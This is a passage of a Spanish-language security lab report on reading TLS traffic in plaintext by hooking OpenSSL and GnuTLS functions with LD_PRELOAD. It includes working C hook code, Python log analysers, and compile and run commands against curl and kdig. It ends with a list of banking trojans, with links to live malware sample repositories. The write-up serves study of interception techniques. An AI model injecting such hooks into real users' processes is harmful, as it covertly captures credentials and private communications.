<li>Esta técnica es la que utilizan familias de malware como <code>ZeuS</code>, <code>Dridex</code> o <code>RedLine Stealer</code> para robar información. Sus ventajas:
<ul>
<li>Invisible para la red: Si analizamos el tráfico Wireshark, se verá tráfico TLS 1.3 perfectamente cifrado. El robo ocurre en la RAM.</li>
<li>Sin alertas de certificado: A diferencia de mitmproxi, aquí no hay certificados falsos ni advertencias de <code>Conexión no segura</code>. curl utiliza el certificado real de Google porque el túnel TLS hacia el exterior es legítimo.</li>
<li>Independiente de la versión de TLS: Como leemos los datos antes de que la librería los procese, siempre los veremos en texto plano.</li>
</ul>
</li>
</ul>
<p><mark>El uso de LD_PRELOAD permite realizar una interceptación de la <code>Capa de Aplicación</code> mediante la técnica de <code>API Spoofing</code>. Al cargar la librería personalizada <code>ssl_hook.so</code> antes que las librerías del sistema, se logra el acceso a los buffers de memoria de las funciones <code>SSL_read</code> y <code>SSL_write</code>, permitiendo el registro de datos sensibles (como cabeceras HTTP o credenciales) y el protocolo de red, de forma transparente.</mark></p>
<br>
<h3 id="ver-los-datos-descifrados"><strong>Ver los datos descifrados</strong></h3>
<pre class="hljs"><code><div>cat /tmp/ssl_intercept.log
</div></code></pre>
<br>
<h3 id="programa-python-para-leer-los-logs-ssl-analyzerpy"><strong>Programa Python para leer los logs: ssl analyzer.py</strong></h3>
<p>Este script en Python se encarga de consumir el fichero de log <code>/tmp/ssl_intercept.log</code> que es donde se vuelcan los datos y reconstruye el texto plano observado en el endpoint. Mientras la librería en C realiza el trabajo sucio de interceptar la memoria, este script procesará los datos para darles un formato legible.</p>
<p>Código del script ssl_analyzer.py:</p>
<pre class="hljs"><code><div>import os
import sys
import time
from datetime import datetime

# Ruta del archivo o FIFO generada por el Hook en C
LOG_PATH = &quot;/tmp/ssl_intercept.log&quot;

def analyze_traffic():
    print(f&quot;[*] Iniciando análisis de tráfico SSL/TLS descifrado...&quot;)
    print(f&quot;[*] Monitoreando: {LOG_PATH}\n&quot; + &quot;-&quot;*60)

    # Verificamos si el archivo existe antes de empezar
    if not os.path.exists(LOG_PATH):
        # Si es un fichero, lo creamos; si es FIFO, esperamos a que el Hook lo abra
        open(LOG_PATH, 'a').close()

    try:
        with open(LOG_PATH, 'r', errors='replace') as f:
            # Ir al final del archivo si es un log persistente
            f.seek(0, 2)
            
            while True:
                line = f.readline()
                if not line:
                    time.sleep(0.1)  # Evitar consumo excesivo de CPU
                    continue

                # Parseo de metadatos
                timestamp = datetime.now().strftime(&quot;%Y-%m-%d %H:%M:%S.%f&quot;)[:-3]
                
                if &quot;[WRITE]&quot; in line:
                    direction = &quot;\033[91m[SENT]\033[0m&quot;  # Rojo para datos salientes
                    content = line.replace(&quot;[WRITE]   &quot;, &quot;&quot;).strip()
                elif &quot;[READ ]&quot; in line:
                    direction = &quot;\033[92m[RECV]\033[0m&quot;  # Verde para datos entrantes
                    content = line.replace(&quot;[READ ]   &quot;, &quot;&quot;).strip()
                else:
                    continue

                # Mostrar información formateada
                if content and content != &quot;---&quot;:
                    print(f&quot;[{timestamp}] {direction} | Data: {content[:100]}...&quot;)
                    
    except KeyboardInterrupt:
        print(&quot;\n[*] Análisis finalizado por el usuario.&quot;)
    except Exception as e:
        print(f&quot;[-] Error: {e}&quot;)

if __name__ == &quot;__main__&quot;:
    analyze_traffic()
</div></code></pre>
<div style="page-break-before: always;"></div>
<h3 id="ejecuci%C3%B3n-del-laboratorio-completo"><strong>Ejecución del Laboratorio Completo</strong></h3>
<p>Para ver el sistema funcionando íntegramente: <code>La Técnica de Intercepción en Memoria + El Análisis Externo</code>, seguimos este orden:</p>
<ul>
<li>Terminal 1 - Compilar: Compilar como librería compartida: <code>gcc -shared -fPIC -o ssl_hook.so ssl_hook.c -ldl</code></li>
<li>Terminal 1 - Analizar: Lanzamos el script de Python: <code>python3 ssl_analyzer.py</code>.
<img src="capturas/tarea3-modulo5-stealer-1.png" alt="tarea3-modulo5-stealer-1"></li>
<li>Terminal 2 - Atacar: Ejecutamos cargando la librería de C: <code>LD_PRELOAD=./ssl_hook.so curl -s https://www.google.com</code>.
<img src="capturas/tarea3-modulo5-stealer-2.png" alt="tarea3-modulo5-stealer-2"></li>
<li>Vemos el trafico descifrado:
<img src="capturas/tarea3-modulo5-stealer-3.png" alt="tarea3-modulo5-stealer-3">
Vemos que empieza a mostrar el contenido que curl está procesando en memoria ANTES de cifrarlo:
<ul>
<li>[SENT] (Rojo)	Intercepción de SSL_write: Vemos la petición del cliente. El mensaje PRI * HTTP/2.0... es el prefacio de conexión de HTTP/2, indicando que la comunicación es moderna y eficiente.</li>
<li>[RECV] (Verde)	Intercepción de SSL_read: Vemos el contenido descargado. Se lee perfectamente el &lt;!doctype html&gt;&lt;html ...&gt;, que es el código fuente real de la página de Google.</li>
</ul>
</li>
</ul>
<p><mark>Se confirma el éxito de la Técnica 5 - Hooking a la librería OpenSSL como método de Interceptar y Descifrar Tráfico TLS a través de la exfiltración de datos. Esta técnica permite obtener el contenido íntegro en texto claro. La presencia de cabeceras HTTP/2 y código HTML en el log del analizador valida que la seguridad del protocolo TLS se ve comprometida si el atacante posee la capacidad de inyectar código en la RAM del sistema objetivo.</mark></p>
<h2 id="63-empleando-la-t%C3%A9cnica-5-en-el-cliente-kdig"><strong>6.3 Empleando la técnica 5 en el cliente kdig</strong></h2>
<p>Para aplicar la técnica del Stealer, Hook en memoria, al cliente kdig, ya no necesitamos engañar a la red con certificados falsos ni usar el puerto 8080. Ahora interceptaremos la librería de funciones dentro del propio ordenador. Atacaremos la comunicación directamente mientras sale hacia el servidor real de Cloudflare.</p>
<p>Sabemos que con la herramienta kdig, obteniamos: <code>;; DEBUG: TLS session (TLS1.3)-(ECDHE-X25519)-(ECDSA-SECP256R1-SHA256)-(AES-256-GCM)</code>. Ese formato de nombrar la Cipher Suite es característico de GnuTLS, no de OpenSSL. La librería que hicimos anteriormente <code>ssl_hook.c</code> estaba diseñada para interceptar <code>SSL_read</code> y <code>SSL_write</code> (funciones de OpenSSL), pero kdig está utilizando <code>gnutls_record_recv</code> y <code>gnutls_record_send</code>.</p>
<p>Para solucionar esto y completar el laboratorio con el cliente kdig, debemos adaptar la técnica de API Spoofing a GnuTLS. Creamos un nueva librería: <code>gnutls_hook.c</code></p>
<pre class="hljs"><code><div>#define _GNU_SOURCE
#include &lt;stdio.h&gt;
#include &lt;dlfcn.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;string.h&gt;

// Definición de tipos para las funciones originales de GnuTLS
typedef ssize_t (*gnutls_func)(void *session, void *data, size_t data_size);

void log_data(const char *prefix, const void *buf, size_t num) {
    int fd = open(&quot;/tmp/ssl_intercept.log&quot;, O_WRONLY | O_APPEND | O_CREAT, 0644);
    if (fd != -1) {
        write(fd, prefix, 10);
        write(fd, buf, num);
        write(fd, &quot;\n---\n&quot;, 5);
        close(fd);
    }
}

// Interceptación de envío (Equivalente a SSL_write)
ssize_t gnutls_record_send(void *session, const void *data, size_t data_size) {
    static gnutls_func real_send = NULL;
    if (!real_send) real_send = dlsym(RTLD_NEXT, &quot;gnutls_record_send&quot;);
    
    log_data(&quot;[SENT ]   &quot;, data, data_size);
    return real_send(session, (void*)data, data_size);
}

// Interceptación de recepción (Equivalente a SSL_read)
ssize_t gnutls_record_recv(void *session, void *data, size_t data_size) {
    static gnutls_func real_recv = NULL;
    if (!real_recv) real_recv = dlsym(RTLD_NEXT, &quot;gnutls_record_recv&quot;);

    ssize_t result = real_recv(session, data, data_size);
    if (result &gt; 0) {
        log_data(&quot;[RECV ]   &quot;, data, result);
    }
    return result;
}
</div></code></pre>
<ul>
<li>
<p>Compilación de esta nueva librería: <code>gcc -shared -fPIC -o gnutls_hook.so gnutls_hook.c -ldl</code>.</p>
</li>
<li>
<p>Nuevo script de Python. Necesitamos que el script de Python convierta los datos a un formato Hexdump: <code>ssl_analyzer_gnutls.py</code></p>
</li>
</ul>
<pre class="hljs"><code><div>import os
import time
import binascii
from datetime import datetime

LOG_PATH = &quot;/tmp/ssl_intercept.log&quot;

def hexdump(data):
    # Función para mostrar hex y ascii al lado, como en Wireshark/mitmproxy
    try:
        hex_part = binascii.hexlify(data.encode('latin1', 'replace')).decode()
        readable = &quot;&quot;.join([c if 32 &lt;= ord(c) &lt;= 126 else &quot;.&quot; for c in data])
        return f&quot;{hex_part[:40]}... | {readable[:30]}&quot;
    except:
        return &quot;[Error al procesar binario]&quot;

def analyze_traffic():
    print(f&quot;[*] Analizador Forense de Memoria (DNS-over-TLS) iniciado...&quot;)
    print(f&quot;[*] Monitoreando: {LOG_PATH}\n&quot; + &quot;-&quot;*70)

    if not os.path.exists(LOG_PATH):
        open(LOG_PATH, 'a').close()

    try:
        f = open(LOG_PATH, 'r', errors='replace')
        f.seek(0, 2)
        
        while True:
            line = f.readline()
            if not line:
                time.sleep(0.1)
                continue

            timestamp = datetime.now().strftime(&quot;%H:%M:%S&quot;)
            
            if &quot;[SENT ]&quot; in line:
                direction = &quot;\033[91m[SENT]\033[0m&quot;
                raw_data = line.replace(&quot;[SENT ]   &quot;, &quot;&quot;).strip()
                print(f&quot;[{timestamp}] {direction} {hexdump(raw_data)}&quot;)
            elif &quot;[RECV ]&quot; in line:
                direction = &quot;\033[92m[RECV]\033[0m&quot;
                raw_data = line.replace(&quot;[RECV ]   &quot;, &quot;&quot;).strip()
                print(f&quot;[{timestamp}] {direction} {hexdump(raw_data)}&quot;)
                    
    except KeyboardInterrupt:
        print(&quot;\n[*] Fin del análisis.&quot;)

if __name__ == &quot;__main__&quot;:
    analyze_traffic()
</div></code></pre>
<ul>
<li>
<p>Ejecutamos el nuevo script de Python: <code>python3 ssl_analyzer_gnutls.py</code></p>
</li>
<li>
<p>Ejecutamos kdig con el nuevo hook:</p>
</li>
</ul>
<pre class="hljs"><code><div>LD_PRELOAD=$PWD/gnutls_hook.so kdig -d @1.0.0.1 +tls +tls-host=one.one.one.one cloudflare.com
</div></code></pre>
<p><img src="capturas/tarea3-modulo5-stealer-4.png" alt="stealer4">
donde:</p>
<ul>
<li>[HOOK] Interceptando envío de datos... [HOOK] Interceptando recepción de datos...:  Esto confirma que la librería en C está &quot;atrapando&quot; las funciones de GnuTLS en tiempo real.</li>
</ul>
<p><mark>Vemos la captura del tráfico descifrado en el script de python que muestra el tráfico DESCRIFRADO:</mark>
<img src="capturas/tarea3-modulo5-stealer-5.png" alt="stealer5">
donde:</p>
<ul>
<li>Vemos en pantalla es la representación hexadecimal de los datos que kdig procesó en su memoria RAM antes de enviarlos a la red.</li>
<li>Protocolo Binario: <mark>A diferencia de HTTP que una texto claro, el protocolo DNS utiliza campos de longitud fija y etiquetas binarias.</mark></li>
<li>Contenido: Los puntos (.) indican caracteres no imprimibles. Sin embargo, en la columna hexadecimal, cadenas como 0001 indican que se trata de una consulta de tipo A (IPv4).</li>
<li>[SENT]: bytes que el proceso envió a través del canal TLS.</li>
<li>[RECV]: bytes que el proceso recibió ya descifrados desde TLS.</li>
<li>[SENT] 003f... → 0x003f = 63 bytes (longitud del mensaje DNS que viene detrás)</li>
<li>[RECV] 013f... → 0x013f = 319 bytes (longitud del mensaje DNS de respuesta)</li>
<li>3f38 0120 0001 .... →
<ul>
<li>Transaction ID (2 bytes): 3f38… → es el ID de la consulta.</li>
<li>Flags (2 bytes): 0120 es el campo de flags.</li>
<li>QDCOUNT / ANCOUNT / NSCOUNT / ARCOUNT (2 bytes cada uno): contadores de preguntas/respuestas/etc.</li>
<li>En las respuestas suele verse que ANCOUNT &gt; 0 (hay respuestas).</li>
<li>Se observa el framing de DoT (prefijo de 2 bytes con longitud): 0x003f en consultas y 0x013f en respuestas.</li>
<li>Los Transaction IDs (0x3f38, 0x2c51) coinciden entre consulta y respuesta, confirmando correlación dentro del túnel TLS.</li>
<li>QDCOUNT=1 en consultas, ANCOUNT=2 en respuestas y ARCOUNT=1 indica presencia de EDNS(0)/OPT.</li>
</ul>
</li>
</ul>
<p><mark>Se confirma el éxito de la Técnica 5 en el cliente kdig mediante la evidencia de datos exfiltrados en texto claro</mark></p>
<div style="page-break-before: always;"></div>
<h2 id="64-ejemplos-de-malware-que-usan-t%C3%A9cnicas-api-hook"><strong>6.4 Ejemplos de malware que usan técnicas API HOOK</strong></h2>
<p>Ejemplos de familias de malware que, aunque técnicamente no descifran el protocolo TLS, en el sentido de romper el cifrado, sí utilizan técnicas de intercepción, como el hooking de APIs, para leer los datos en texto claro antes de que se cifren o después de que se descifren.</p>
<h3 id="zeus-zbot"><strong>ZeuS (Zbot)</strong></h3>
<p>Es uno de los troyanos bancarios más famosos y está disponible en varias versiones dentro del repositorio.</p>
<p>Técnica: Utiliza form-grabbing e intercepción mediante Man-in-the-Browser - MitB.</p>
<p>Funcionamiento: Inyecta código en el navegador de la víctima para interceptar las funciones de red (como PR_Write de la librería NSS o las APIs de Wininet). De esta manera, el malware puede leer los datos de formularios bancarios justo antes de que el navegador los envíe a través del túnel TLS.</p>
<p>Ubicación en theZoo: <a href="https://github.com/ytisf/theZoo/tree/master/malware/Binaries/ZeusBankingVersion_26Nov2013">malware/Binaries/ZeusBankingVersion_26Nov2013.</a></p>
<h3 id="dridex"><strong>Dridex</strong></h3>
<p>Este malware es un sucesor espiritual de otros troyanos bancarios y también se encuentra en theZoo. Dridex, también conocido como Cridex o Bugat.</p>
<p>Técnica: Se especializa en el hooking de APIs de Windows relacionadas con las comunicaciones de red.</p>
<p>Funcionamiento: Al igual que ZeuS, intercepta las funciones que manejan las peticiones HTTP/HTTPS para exfiltrar credenciales bancarias antes de que sean protegidas por la capa de transporte.</p>
<p>Ubicación en <a href="https://bazaar.abuse.ch/browse/tag/Dridex/">theZoo: Busca en la carpeta malware/Binaries/Dridex.</a></p>
<h3 id="carberp"><strong>Carberp</strong></h3>
<p>Un troyano bancario sofisticado que también utiliza técnicas de intercepción de tráfico.</p>
<p>Técnica: Utiliza componentes complejos para crear pilas TCP/IP ocultas y realizar intercepción de datos de sesión.</p>
<p>Funcionamiento: Es conocido por su capacidad de realizar capturas de datos directamente desde la memoria del proceso del navegador, evitando así tener que lidiar con el cifrado TLS en el cable.</p>
<p>Ubicación en MalwareBazaar: <a href="https://github.com/ytisf/theZoo/tree/master/malware/Source/Original/Carberp">MalwareBazaar Carberp</a></p>
<h3 id="dyre--trickbot"><strong>Dyre / TrickBot</strong></h3>
<p>Técnica: Dyre fue pionero en interceptar el tráfico HTTPS mediante el uso de una técnica de redirección local y hooking de navegadores para extraer datos de aplicaciones web seguras.</p>
<p>TrickBot tiene similitudes con Dyre.</p>
<p>Ubicación: https://github.com/ytisf/theZoo/tree/master/malware/Binaries/Dyre</p>

</body>
</html>
